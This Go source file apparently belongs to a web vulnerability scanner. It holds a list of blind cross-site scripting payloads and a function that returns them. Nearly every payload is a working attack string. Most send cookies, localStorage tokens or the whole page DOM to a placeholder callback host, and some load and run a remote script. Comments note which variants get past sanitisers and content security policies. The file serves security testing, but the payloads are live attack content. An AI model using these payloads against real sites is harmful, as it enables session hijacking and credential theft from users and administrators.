package xss

// Blind / out-of-band XSS payloads.
//
// These payloads do not rely on response reflection. They fire on render in
// a context the attacker controls — an admin panel, a log viewer, a webhook
// consumer — and exfiltrate to an out-of-band host. The {OAST_HOST}
// placeholder is rewritten by the scanner with the active OAST callback
// origin (e.g. interactsh, project-discovery oast, custom collaborator).
//
// Source: PortSwigger BARE methodology, AWVS `Blind_XSS.script` shape,
// HackTricks BXSS chapter.

var blindPayloads = []Payload{
	// Remote script include — runs whatever the OAST server returns.
	{Value: "<script src=//{OAST_HOST}/x></script>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: remote script include"},
	{Value: "<script src=https://{OAST_HOST}/x.js></script>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: HTTPS remote script"},
	{Value: "\"><script src=//{OAST_HOST}/></script>", Context: AttributeContext, Type: TypeBlind, Description: "BXSS: attribute break + script include"},

	// Image-based exfil — works wherever <img> renders but <script> is
	// stripped (most rich-text sanitisers).
	{Value: "<img src=x onerror=this.src='//{OAST_HOST}/?c='+document.cookie>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: img onerror cookie exfil"},
	{Value: "<img src=//{OAST_HOST}/pixel.gif>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: img fetch beacon"},

	// fetch() — cleanly exfils response body / cookies via POST.
	{Value: "<script>fetch('//{OAST_HOST}/?c='+document.cookie)</script>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: fetch() cookie exfil"},
	{Value: "<script>fetch('//{OAST_HOST}/dom',{method:'POST',body:document.documentElement.outerHTML})</script>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: fetch() full-DOM exfil"},

	// new Image() — terser than fetch, survives more sanitisers.
	{Value: "<script>new Image().src='//{OAST_HOST}/?c='+btoa(document.cookie)</script>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: Image() base64 cookie exfil"},

	// Beacon API — fires even on page unload (long-form admin pages).
	{Value: "<script>navigator.sendBeacon('//{OAST_HOST}/b',document.cookie)</script>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: sendBeacon cookie exfil"},

	// SVG variant — survives many img-only filters.
	{Value: "<svg/onload=fetch('//{OAST_HOST}/svg?'+document.cookie)>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: svg onload fetch exfil"},

	// JS-context — when injection lands inside <script>.
	{Value: ";fetch('//{OAST_HOST}/?'+document.cookie);//", Context: JavaScriptContext, Type: TypeBlind, Description: "BXSS: JS-context fetch exfil"},

	// Storage exfil — pulls localStorage tokens (common in SPAs).
	{Value: "<script>fetch('//{OAST_HOST}/ls?'+btoa(JSON.stringify(localStorage)))</script>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: localStorage exfil"},

	// Iframe fingerprint — confirms render even when XHR is CSP-blocked.
	{Value: "<iframe src=//{OAST_HOST}/frame></iframe>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: iframe load beacon (CSP-resilient)"},

	// Form auto-submit — survives more sanitisers than <script>; CSRF leverage.
	{Value: "<form action=//{OAST_HOST}/f method=POST id=f><input name=c><script>f.c.value=document.cookie;f.submit()</script></form>", Context: HTMLContext, Type: TypeBlind, Description: "BXSS: auto-submit form cookie exfil"},
}

// GetBlindPayloads returns blind / out-of-band XSS payloads. Each value
// contains the {OAST_HOST} placeholder which callers replace with their
// OAST callback origin before sending.
func GetBlindPayloads() []Payload {
	return blindPayloads
}
